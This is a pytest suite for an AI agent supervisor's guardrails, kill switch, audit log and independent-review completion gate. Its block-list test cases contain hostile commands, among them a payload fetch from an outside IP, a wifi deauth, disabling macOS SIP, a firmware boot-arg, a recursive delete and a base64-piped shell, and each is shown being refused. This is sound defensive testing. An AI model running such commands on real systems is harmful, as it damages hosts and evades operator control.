"""Butler supervisor powers: kill switch, guardrails, audit, host tools and the
independent-review completion gate."""

from __future__ import annotations

import json
import os
import subprocess
from contextlib import asynccontextmanager
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from tests.v3.async_test_support import anyio_backend as anyio_backend

from nebula.v3.butler_host_ops import ButlerHostOps
from nebula.v3.butler_independent_review import (
    REVIEW_KEY,
    ButlerIndependentReview,
    ReviewUnavailable,
    independent_review_approves,
    normalize_model,
    proposal_digest,
)
from nebula.v3.butler_supervisor_policy import (
    GuardrailViolation,
    SupervisorDisabled,
    load_policy,
    screen_command,
)
from nebula.v3.context import resolve_context_limits  # noqa: F401  (import check)
from nebula.v3.domain import (
    GOAL_COMPLETION_PROPOSAL_KEY,
    ChatBackend,
    ChatGoal,
    ChatGoalStatus,
)
from nebula.v3.known_model_limits import KNOWN_MODEL_LIMITS
from nebula.v3.providers import _claude_rejects_sampling


MIRROR = "/srv/lab/repo/mirror"
HOSTS = json.dumps(
    {
        "core": {"local": True},
        "responder": {
            "address": "192.0.2.231",
            "user": "lab",
            "identity_file": "/tmp/k",
        },
        "rflab": {"address": "192.0.2.50", "rf_lab": True},
    }
)


def _env(tmp_path: Path, **extra: str) -> dict[str, str]:
    env = {
        "NEBULA_BUTLER_SUPERVISOR_ENABLED": "1",
        "NEBULA_BUTLER_SUPERVISOR_HOSTS": HOSTS,
        "NEBULA_BUTLER_SUPERVISOR_AUDIT_LOG": str(tmp_path / "audit.jsonl"),
        "NEBULA_BUTLER_SUPERVISOR_PROTECTED_PATHS": MIRROR,
        "NEBULA_BUTLER_SUPERVISOR_PRIVATE_STRINGS": "operator@example.test",
        "NEBULA_BUTLER_SUPERVISOR_EXTERNAL_HOSTS": "github.com,vendor.example",
        "NEBULA_BUTLER_SUPERVISOR_OPERATOR_ONLY_PATTERNS": "reports\\.vendor\\.example\nvendor-account-tool",
    }
    env.update(extra)
    return env


def _policy(tmp_path: Path, **extra: str):
    return load_policy(_env(tmp_path, **extra))


def _screen(tmp_path: Path, command: str, host: str = "core", **extra: str) -> None:
    policy = _policy(tmp_path, **extra)
    screen_command(policy, command, host=policy.host(host))


# --- policy and kill switch ------------------------------------------------


def test_supervisor_is_off_by_default_and_the_flag_is_the_kill_switch(
    tmp_path: Path,
) -> None:
    policy = load_policy({"NEBULA_V3_DATA_DIR": str(tmp_path)})
    assert policy.enabled is False
    with pytest.raises(SupervisorDisabled):
        policy.require_enabled()
    assert load_policy(_env(tmp_path)).enabled is True
    assert (
        load_policy(_env(tmp_path, NEBULA_BUTLER_SUPERVISOR_ENABLED="0")).enabled
        is False
    )


def test_only_allowlisted_lab_hosts_are_reachable(tmp_path: Path) -> None:
    policy = _policy(tmp_path)
    assert policy.host("responder").address == "192.0.2.231"
    with pytest.raises(GuardrailViolation) as caught:
        policy.host("somewhere-else")
    assert caught.value.rule == "host_not_allowlisted"


# --- guardrails ----------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "ssh evil.example.com uptime",
        "curl http://203.0.113.9/payload",
        "nmap -sS 198.51.100.0/24",
        "ping -c1 8.8.8.8",
        "git push https://gitlab.example.org/x.git main",
    ],
)
def test_network_tools_may_name_only_lab_hosts(tmp_path: Path, command: str) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, command)
    assert caught.value.rule == "host_not_allowlisted"


@pytest.mark.parametrize(
    "command",
    [
        "ssh lab@192.0.2.231 uptime",
        "ping -c1 192.0.2.231",
        "curl -s http://127.0.0.1:8000/api/v1/butler/check-interval",
        "git fetch -q https://github.com/example/shared.git main",
        "git push -q https://github.com/example/shared.git main",
        "ls -la /var/lib/lab/scratch",
        "python3 -I tick.py",
    ],
)
def test_lab_commands_are_allowed(tmp_path: Path, command: str) -> None:
    _screen(tmp_path, command)


def test_radio_tools_run_only_on_rf_lab_hosts(tmp_path: Path) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, "aireplay-ng --deauth 5 wlan0", host="core")
    assert caught.value.rule == "rf_outside_lab"
    _screen(tmp_path, "hcitool scan", host="rflab")


def test_uploads_outside_the_lab_are_refused_even_to_allowed_hosts(
    tmp_path: Path,
) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(
            tmp_path, "curl -X POST -d @r.json https://api.github.com/repos/x/y/issues"
        )
    assert caught.value.rule == "operator_only_report_submission"
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, "curl -F f=@r.pdf https://unlisted.example/submit")
    assert caught.value.rule == "host_not_allowlisted"


@pytest.mark.parametrize(
    "command",
    [
        f"git -C {MIRROR} commit -am x",
        f"git -C {MIRROR} push origin main",
        f"git -C {MIRROR} reset --hard HEAD~1",
        f"echo x > {MIRROR}/README.md",
        f"rm -rf {MIRROR}/src",
        f"sed -i s/a/b/ {MIRROR}/AGENTS.md",
        f"cd {MIRROR} && git checkout -b feature",
    ],
)
def test_production_mirror_is_pull_only(tmp_path: Path, command: str) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, command)
    assert caught.value.rule == "production_mirror_read_only"


@pytest.mark.parametrize(
    "command",
    [
        f"git -C {MIRROR} status --short",
        f"git -C {MIRROR} log --oneline -3",
        f"git -C {MIRROR} fetch -q origin",
        f"cat {MIRROR}/AGENTS.md",
        f"sed -n 1,20p {MIRROR}/AGENTS.md",
    ],
)
def test_production_mirror_reads_are_allowed(tmp_path: Path, command: str) -> None:
    _screen(tmp_path, command)


def test_production_mirror_write_from_its_cwd_is_refused(tmp_path: Path) -> None:
    policy = _policy(tmp_path)
    with pytest.raises(GuardrailViolation):
        screen_command(
            policy,
            "git commit -am x",
            host=policy.host("core"),
            cwd=MIRROR + "/src",
        )


@pytest.mark.parametrize(
    ("command", "rule"),
    [
        ("csrutil disable", "operator_only_sip"),
        ("nvram boot-args='amfi_get_out_of_my_way=1'", "operator_only_firmware"),
        ("sudo reboot", "operator_only_hardware_power"),
        ("uhubctl -a cycle -p 2", "operator_only_hardware_power"),
        ("sysadminctl -resetPasswordFor lab", "operator_only_account"),
        ("security add-generic-password -a x -s y -w z", "operator_only_account"),
        (
            "sendmail security@vendor.example < report.txt",
            "operator_only_report_submission",
        ),
        ("gh issue create --title report", "operator_only_report_submission"),
        (
            "curl -F f=@report.pdf https://upload.vendor.example/submit",
            "operator_only_report_submission",
        ),
        ("curl -s https://reports.vendor.example/status", "operator_only_configured"),
        ("vendor-account-tool --sign-in", "operator_only_configured"),
    ],
)
def test_operator_only_actions_are_never_automated(
    tmp_path: Path, command: str, rule: str
) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, command, NEBULA_BUTLER_SUPERVISOR_ALLOW_SUDO="1")
    assert caught.value.rule == rule


def test_private_strings_never_leave_the_host(tmp_path: Path) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, "git commit --author='Op <operator@example.test>' -m x")
    assert caught.value.rule == "private_data"


def test_git_worktrees_and_obfuscated_shells_are_refused(tmp_path: Path) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, "git worktree add ../wt main")
    assert caught.value.rule == "git_worktree"
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, "echo Y3NydXRpbCBkaXNhYmxl | base64 -d | sh")
    assert caught.value.rule == "obfuscated_command"


def test_general_sudo_needs_its_own_operator_flag(tmp_path: Path) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(tmp_path, "sudo systemctl restart nebula-core")
    assert caught.value.rule == "sudo_disabled"
    _screen(
        tmp_path,
        "sudo systemctl status nebula-core",
        NEBULA_BUTLER_SUPERVISOR_ALLOW_SUDO="1",
    )


# --- host tools (real subprocesses on this host) ------------------------


def _ops(tmp_path: Path, events: list[dict[str, Any]] | None = None, **extra: str):
    env = _env(tmp_path, **extra)

    async def sink(entry: dict[str, Any]) -> None:
        if events is not None:
            events.append(entry)

    return ButlerHostOps(
        project_id="p1",
        actor="case-1",
        policy_loader=lambda: load_policy(env),
        event_sink=sink,
    )


def _audit(tmp_path: Path) -> list[dict[str, Any]]:
    path = tmp_path / "audit.jsonl"
    return [json.loads(line) for line in path.read_text().splitlines()]


@pytest.mark.anyio
async def test_shell_runs_audits_and_redacts(tmp_path: Path) -> None:
    events: list[dict[str, Any]] = []
    ops = _ops(tmp_path, events)
    result = await ops.shell(
        {
            "host": "core",
            "command": "printf 'hello\\n'; printf 'oops' >&2; exit 3",
            "reason": "test run",
        }
    )
    assert result["exit_code"] == 3
    assert result["stdout"] == "hello\n"
    assert result["stderr"] == "oops"
    [entry] = _audit(tmp_path)
    assert entry["tool"] == "shell"
    assert entry["host"] == "core"
    assert entry["exit_code"] == 3
    assert entry["outcome"] == "completed"
    assert len(entry["stdout_sha256"]) == 64
    assert entry["actor"] == "case-1"
    assert events and events[0]["tool"] == "shell"


@pytest.mark.anyio
async def test_refused_commands_are_audited_and_never_run(tmp_path: Path) -> None:
    marker = tmp_path / "ran"
    ops = _ops(tmp_path)
    with pytest.raises(GuardrailViolation):
        await ops.shell(
            {
                "host": "core",
                "command": f"touch {marker}; csrutil disable",
                "reason": "should be refused",
            }
        )
    assert not marker.exists()
    [entry] = _audit(tmp_path)
    assert entry["outcome"] == "refused"
    assert entry["rule"] == "operator_only_sip"


@pytest.mark.anyio
async def test_kill_switch_stops_every_tool_without_running(tmp_path: Path) -> None:
    ops = _ops(tmp_path, NEBULA_BUTLER_SUPERVISOR_ENABLED="0")
    with pytest.raises(SupervisorDisabled):
        await ops.shell({"host": "core", "command": "true", "reason": "off"})
    with pytest.raises(SupervisorDisabled):
        await ops.runner_control(
            {"service": "runner", "verb": "restart", "reason": "off"}
        )


@pytest.mark.anyio
async def test_unlisted_host_is_refused_and_audited(tmp_path: Path) -> None:
    ops = _ops(tmp_path)
    with pytest.raises(GuardrailViolation):
        await ops.shell({"host": "elsewhere", "command": "true", "reason": "x" * 3})
    assert _audit(tmp_path)[0]["rule"] == "host_not_allowlisted"


@pytest.mark.anyio
async def test_shell_timeout_kills_the_process_group(tmp_path: Path) -> None:
    ops = _ops(tmp_path)
    result = await ops.shell(
        {
            "host": "core",
            "command": "sleep 30",
            "timeout_seconds": 1,
            "reason": "timeout test",
        }
    )
    assert result["timed_out"] is True
    assert _audit(tmp_path)[0]["outcome"] == "timeout"


@pytest.mark.anyio
async def test_signal_checks_process_identity(tmp_path: Path) -> None:
    child = subprocess.Popen(["sleep", "60"])
    try:
        ops = _ops(tmp_path)
        wrong = await ops.signal(
            {
                "host": "core",
                "pid": child.pid,
                "signal": "TERM",
                "expected_command_substring": "completion_notifier",
                "reason": "identity mismatch",
            }
        )
        assert wrong["exit_code"] == 4
        assert child.poll() is None
        right = await ops.signal(
            {
                "host": "core",
                "pid": child.pid,
                "signal": "TERM",
                "expected_command_substring": "sleep 60",
                "reason": "identity match",
            }
        )
        assert right["exit_code"] == 0
        assert child.wait(timeout=5) != 0
    finally:
        if child.poll() is None:
            child.kill()


@pytest.mark.anyio
async def test_signal_refuses_core_itself(tmp_path: Path) -> None:
    ops = _ops(tmp_path)
    with pytest.raises(GuardrailViolation):
        await ops.signal(
            {
                "host": "core",
                "pid": os.getpid(),
                "signal": "KILL",
                "expected_command_substring": "python",
                "reason": "must refuse",
            }
        )


@pytest.mark.anyio
async def test_runner_control_uses_only_the_sanctioned_script(tmp_path: Path) -> None:
    script = tmp_path / "control"
    script.write_text('#!/bin/sh\necho "$@"\n')
    script.chmod(0o755)
    ops = _ops(tmp_path, NEBULA_BUTLER_SUPERVISOR_RUNNER_CONTROL=str(script))
    result = await ops.runner_control(
        {"service": "runner", "verb": "restart", "reason": "ingress stall"}
    )
    entry = _audit(tmp_path)[-1]
    assert entry["tool"] == "runner_control"
    assert entry["command"] == f"sudo -n {script} restart"
    assert result["exit_code"] is not None
    with pytest.raises(GuardrailViolation):
        await ops.runner_control(
            {"service": "ingress", "verb": "restart", "reason": "not supported"}
        )


def _git(repo: Path, *args: str) -> None:
    subprocess.run(
        [
            "git",
            "-C",
            str(repo),
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@example.invalid",
            *args,
        ],
        check=True,
        capture_output=True,
    )


@pytest.mark.anyio
async def test_run_gate_runs_only_committed_gates_and_reports_pass_fail(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "gates"
    repo.mkdir()
    _git(repo, "init", "-q")
    gate = repo / "bundle_check.py"
    gate.write_text("import sys\nprint('RESULT FAIL failures=1')\nsys.exit(0)\n")
    _git(repo, "add", "bundle_check.py")
    _git(repo, "commit", "-qm", "gate")
    ops = _ops(tmp_path, NEBULA_BUTLER_SUPERVISOR_GATE_ROOTS=str(repo))
    result = await ops.run_gate({"path": str(gate), "reason": "check bundle"})
    assert result["gate"]["stated_result"] == "FAIL"
    assert result["gate"]["passed"] is False
    gate.write_text("print('RESULT PASS failures=0')\n")
    with pytest.raises(GuardrailViolation) as caught:
        await ops.run_gate({"path": str(gate), "reason": "uncommitted edit"})
    assert caught.value.rule == "gate_uncommitted"
    _git(repo, "commit", "-qam", "fix")
    result = await ops.run_gate({"path": str(gate), "reason": "check bundle"})
    assert result["gate"]["passed"] is True
    outside = tmp_path / "loose.py"
    outside.write_text("print('RESULT PASS')\n")
    with pytest.raises(GuardrailViolation) as caught:
        await ops.run_gate({"path": str(outside), "reason": "not allowlisted"})
    assert caught.value.rule == "gate_not_allowlisted"


# --- independent review and the no-self-approval gate -------------------


def _goal(**metadata: Any) -> ChatGoal:
    return ChatGoal(
        id="g1",
        engagement_id="p1",
        session_id="s1",
        objective="Validate the candidate.",
        completion_criteria=["Disposition backed by evidence."],
        status=ChatGoalStatus.BLOCKED,
        blocked_reason="awaiting closure review",
        completion_requires_review=True,
        metadata={
            GOAL_COMPLETION_PROPOSAL_KEY: {
                "completion_summary": "KILLED",
                "completion_evidence": [{"path": "/evidence/a.md"}],
            },
            **metadata,
        },
    )


def _record(goal: ChatGoal, **fields: Any) -> dict[str, Any]:
    return {
        "id": "review-1",
        "source": "core_independent_review",
        "verdict": "ACCEPT",
        "proposal_digest": proposal_digest(goal),
        "reviewer_model": "claude-opus-5-5",
        "reviewer_session_id": None,
        "approval_provenance": {
            "source": "core_independent_review",
            "provider_id": "anthropic-1",
            "model": "claude-opus-5-5",
            "review_id": "review-1",
            "packet_sha256": "0" * 64,
            "reviewed_at": "2026-01-01T00:00:00+00:00",
        },
        **fields,
    }


def test_gate_refuses_without_an_independent_review() -> None:
    approved, why = independent_review_approves(_goal(), "vendor/goal-model-1")
    assert not approved
    assert "no independent review" in why


def test_gate_accepts_a_core_review_by_a_different_model() -> None:
    goal = _goal()
    goal.metadata[REVIEW_KEY] = _record(goal)
    assert independent_review_approves(goal, "vendor/goal-model-1")[0]


@pytest.mark.parametrize(
    ("fields", "goal_model", "reason"),
    [
        ({"verdict": "REJECT"}, "goal-model-1", "REJECT"),
        (
            {"reviewer_model": "anthropic/claude-opus-5.5"},
            "claude-opus-5-5",
            "own model",
        ),
        ({"proposal_digest": "0" * 64}, "goal-model-1", "current proposal"),
        ({"source": "butler"}, "goal-model-1", "not written by Core"),
        ({"reviewer_session_id": "s1"}, "goal-model-1", "own session"),
    ],
)
def test_gate_refuses_self_approval_and_stale_or_forged_reviews(
    fields: dict[str, Any], goal_model: str, reason: str
) -> None:
    goal = _goal()
    goal.metadata[REVIEW_KEY] = _record(goal, **fields)
    approved, why = independent_review_approves(goal, goal_model)
    assert not approved
    assert reason in why


def test_model_names_normalize_across_vendors() -> None:
    assert normalize_model("anthropic/claude-opus-5.5") == "claude-opus-5-5"
    assert normalize_model("us.anthropic.claude-opus-5-5") == "claude-opus-5-5"


class _FakeProvider:
    def __init__(self, text: str, model: str = "claude-opus-5-5") -> None:
        self.capabilities = SimpleNamespace(structured_output=True)
        self.text = text
        self.model = model
        self.requests: list[Any] = []

    def require(self, request: Any) -> None:
        pass

    async def complete(self, request: Any) -> Any:
        self.requests.append(request)
        return SimpleNamespace(
            provider_id="anthropic-1", text=self.text, model=self.model
        )


class _FakeGoals:
    def __init__(self, goal: ChatGoal) -> None:
        self.goal = goal

    async def get(self, session_id: str) -> ChatGoal:
        return self.goal


class _FakeWork:
    def __init__(self, goal: ChatGoal) -> None:
        self.goals = _FakeGoals(goal)
        self.calls: list[tuple[str, dict[str, Any]]] = []

    async def add_goal_note(self, project_id: str, arguments: dict[str, Any]) -> dict:
        self.calls.append(("note", arguments))
        return {}

    async def goal_action(self, project_id: str, arguments: dict[str, Any]) -> dict:
        self.calls.append(("action", arguments))
        return {}

    async def create_goal_conversation(self, project_id: str, arguments: dict) -> dict:
        self.calls.append(("create", arguments))
        return {"session_id": "s2", "goal": {"revision": 1}}


class _FakeStore:
    def __init__(self, work: _FakeWork, session_model: str) -> None:
        self.work = work
        self.session = SimpleNamespace(
            id="s1",
            engagement_id="p1",
            metadata={},
            model=session_model,
            backend=ChatBackend.PROVIDER,
            provider_profile_id="openrouter-1",
            harness_profile_id=None,
        )
        self.profile = SimpleNamespace(
            id="anthropic-1",
            enabled=True,
            model_allowlist=["claude-opus-5-5"],
            is_local=False,
            privacy=SimpleNamespace(permits_sensitive_data=True),
        )

    async def get(self, kind: Any, entity_id: str) -> Any:
        return self.session if kind.__name__ == "ChatSession" else self.profile

    @asynccontextmanager
    async def transaction(self):
        work = self.work

        class _Tx:
            async def update(self, kind, entity_id, changes, expected_revision):
                goal = work.goals.goal.model_copy(update=changes)
                work.goals.goal = goal
                return goal

        yield _Tx()


def _review_service(tmp_path: Path, verdict: dict[str, Any], session_model: str):
    evidence = tmp_path / "evidence"
    evidence.mkdir(exist_ok=True)
    (evidence / "a.md").write_text(
        "decisive fact: the check runs before every caller\n"
    )
    goal = _goal()
    goal.metadata[GOAL_COMPLETION_PROPOSAL_KEY]["completion_evidence"] = [
        {"path": str(evidence / "a.md")}
    ]
    work = _FakeWork(goal)
    store = _FakeStore(work, session_model)
    provider = _FakeProvider(json.dumps(verdict))
    ceiling = tmp_path / "ceiling-policy.md"
    ceiling.write_text("CEILING TEXT: test every upgrade path.")
    env = _env(
        tmp_path,
        NEBULA_BUTLER_REVIEW_PROVIDER_ID="anthropic-1",
        NEBULA_BUTLER_REVIEW_EVIDENCE_ROOTS=str(evidence),
        NEBULA_BUTLER_REVIEW_CEILING_POLICY=str(ceiling),
    )
    service = ButlerIndependentReview(
        store,
        work,
        "p1",
        policy_loader=lambda: load_policy(env),
        provider_factory=lambda profile: provider,
    )
    return service, work, provider


@pytest.mark.anyio
async def test_review_refuses_a_reviewer_on_the_goals_own_model(tmp_path: Path) -> None:
    service, _, _ = _review_service(
        tmp_path,
        {"verdict": "ACCEPT", "summary": "ok"},
        session_model="claude-opus-5-5",
    )
    with pytest.raises(ReviewUnavailable) as caught:
        await service.review("s1", [])
    assert caught.value.code == "reviewer_not_independent"


@pytest.mark.anyio
async def test_accept_records_the_verdict_and_completes(tmp_path: Path) -> None:
    service, work, provider = _review_service(
        tmp_path,
        {"verdict": "ACCEPT", "summary": "holds", "ceiling_justified": True},
        session_model="vendor/goal-model-1",
    )
    result = await service.review("s1", [])
    [request] = provider.requests
    assert "CEILING TEXT" in request.instructions
    assert "MUST-DO" in request.instructions
    packet = json.loads(request.messages[0].content)
    assert (
        "the check runs before every caller" in packet["evidence_files"][0]["content"]
    )
    assert "supervisor_notes" not in packet
    record = work.goals.goal.metadata[REVIEW_KEY]
    assert record["verdict"] == "ACCEPT"
    assert record["source"] == "core_independent_review"
    assert independent_review_approves(work.goals.goal, "goal-model-1")[0]
    assert (
        "action",
        {
            "session_id": "s1",
            "expected_revision": 1,
            "action": "complete",
            "reason": f"Independent review ACCEPT ({record['id']})",
        },
    ) in work.calls
    assert result["applied"]["completed"] is True


@pytest.mark.anyio
async def test_reject_feeds_must_dos_back_and_resumes(tmp_path: Path) -> None:
    service, work, _ = _review_service(
        tmp_path,
        {
            "verdict": "REJECT",
            "summary": "no positive control",
            "must_do": ["run control"],
        },
        session_model="goal-model-1",
    )
    await service.review("s1", [])
    kinds = [kind for kind, _ in work.calls]
    assert kinds == ["note", "action"]
    assert "run control" in work.calls[0][1]["text"]
    assert work.calls[1][1]["action"] == "resume"


@pytest.mark.anyio
async def test_residuals_launch_a_null_budget_follow_up_goal(tmp_path: Path) -> None:
    service, work, _ = _review_service(
        tmp_path,
        {
            "verdict": "ACCEPT_WITH_RESIDUALS",
            "summary": "holds narrowly",
            "residuals": ["upgrade path untested"],
        },
        session_model="goal-model-1",
    )
    result = await service.review("s1", [], on_residuals="follow_up")
    create = next(args for kind, args in work.calls if kind == "create")
    assert create["token_budget"] is None and create["step_budget"] is None
    assert create["completion_requires_review"] is True
    assert "upgrade path untested" in create["objective"]
    assert result["applied"]["follow_up"]["session_id"] == "s2"


@pytest.mark.anyio
async def test_butler_goal_action_cannot_complete_without_independent_review(
    tmp_path: Path,
) -> None:
    from nebula.v3.control_assistant_work import ControlAssistantWork

    goal = _goal()
    work = ControlAssistantWork.__new__(ControlAssistantWork)
    session = SimpleNamespace(id="s1", model="goal-model-1")
    sent: list[Any] = []

    async def _chat(project_id: str, session_id: Any) -> Any:
        return session

    async def _request(method: str, path: str, body: Any) -> Any:
        sent.append(body)
        return {}

    async def goal_detail(project_id: str, session_id: Any) -> dict:
        return {}

    work._chat = _chat  # type: ignore[method-assign]
    work._request = _request  # type: ignore[method-assign]
    work.goal_detail = goal_detail  # type: ignore[method-assign]
    work.goals = _FakeGoals(goal)  # type: ignore[attr-defined]
    arguments = {"session_id": "s1", "expected_revision": 1, "action": "complete"}
    with pytest.raises(PermissionError):
        await work.goal_action("p1", arguments)
    assert sent == []
    goal.metadata[REVIEW_KEY] = _record(goal)
    await work.goal_action("p1", arguments)
    assert len(sent) == 1


# --- model support ------------------------------------------------------


def test_claude_opus_5_5_is_a_known_model() -> None:
    assert KNOWN_MODEL_LIMITS["claude-opus-5-5"] == (1_000_000, 128_000)
    # Opus 4.7+ rejects temperature; the Anthropic adapter must omit it.
    assert _claude_rejects_sampling("claude-opus-5-5") is True


# --- gateway registration -----------------------------------------------


def test_gateway_lists_supervisor_tools_only_while_enabled(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from nebula.v3.butler_capabilities import (
        _BACKGROUND_CHANGES,
        SUPERVISOR_ACTIONS,
        ButlerCapabilities,
    )

    monkeypatch.delenv("NEBULA_BUTLER_SUPERVISOR_ENABLED", raising=False)
    work = SimpleNamespace()
    assert ButlerCapabilities._supervisor_actions(None, work, "p1", actor="t") == []
    for key, value in _env(tmp_path).items():
        monkeypatch.setenv(key, value)
    names = {
        tool.spec.name
        for tool in ButlerCapabilities._supervisor_actions(None, work, "p1", actor="t")
    }
    assert names == SUPERVISOR_ACTIONS
    assert SUPERVISOR_ACTIONS <= _BACKGROUND_CHANGES


def test_malformed_operator_pattern_fails_closed(tmp_path: Path) -> None:
    with pytest.raises(GuardrailViolation) as caught:
        _screen(
            tmp_path,
            "ls -la",
            NEBULA_BUTLER_SUPERVISOR_OPERATOR_ONLY_PATTERNS="([unclosed",
        )
    assert caught.value.rule == "operator_only_configured"
